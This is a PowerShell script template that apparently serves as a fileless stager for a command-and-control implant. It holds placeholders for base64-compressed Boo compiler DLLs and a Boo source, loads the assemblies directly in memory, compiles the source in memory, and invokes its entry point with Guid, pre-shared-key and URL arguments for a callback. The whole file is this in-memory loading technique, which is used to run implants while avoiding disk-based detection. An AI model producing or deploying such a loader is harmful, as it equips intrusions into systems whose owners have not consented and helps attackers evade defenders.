[string[]]$ST_args = @($Guid, $Psk, $Url)

$BooLangDLL = @'
BOOLANG_DLL_GOES_HERE
'@

$BooLangParserDLL = @'
BOOLANGPARSER_DLL_GOES_HERE
'@

$BooLangCompilerDLL = @'
BOOLANGCOMPILER_DLL_GOES_HERE
'@

$BooLangExtensionsDLL = @'
BOOLANGEXTENSIONS_DLL_GOES_HERE
'@

function Load-Assembly($EncodedCompressedFile)
{
    $DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
    $UncompressedFileBytes = New-Object Byte[](1900000)
    $DeflatedStream.Read($UncompressedFileBytes, 0, 1900000) | Out-Null
    return [Reflection.Assembly]::Load($UncompressedFileBytes)
}

$BooLangAsm = Load-Assembly($BooLangDLL)
$BooLangExtensionsAsm = Load-Assembly($BoolangExtensionsDLL)
$BooLangCompilerAsm = Load-Assembly($BooLangCompilerDLL)
$BooLangParserAsm = Load-Assembly($BooLangParserDLL)

$Source = @'
SOURCE_CODE_GOES_HERE
'@

$scriptinput = [Boo.Lang.Compiler.IO.StringInput]::new("script.boo", $Source)

$parameters = [Boo.Lang.Compiler.CompilerParameters]::new($false)
$parameters.Input.Add($scriptinput) | Out-Null
$parameters.Pipeline = [Boo.Lang.Compiler.Pipelines.CompileToMemory]::new()
$parameters.Ducky = $true
$parameters.AddAssembly($BooLangAsm)
$parameters.AddAssembly($BooLangExtensionsAsm)
$parameters.AddAssembly($BooLangCompilerAsm)
$parameters.AddAssembly($BooLangParserAsm)
$parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName("mscorlib"))
$parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName("System"))
$parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName("System.Core"))
$parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions"))

$compiler = [Boo.Lang.Compiler.BooCompiler]::new($parameters)
$context = $compiler.Run()

if ($context.GeneratedAssembly -ne $null) {
    
    $context.GeneratedAssembly.Entrypoint.Invoke($null, [object[]](,$ST_args))
}
else {
    Write-Output "[-] Error compiling script:"
    foreach ($compilerError in $context.Errors)
    {
        Write-Output $compilerError.ToString()
    }

}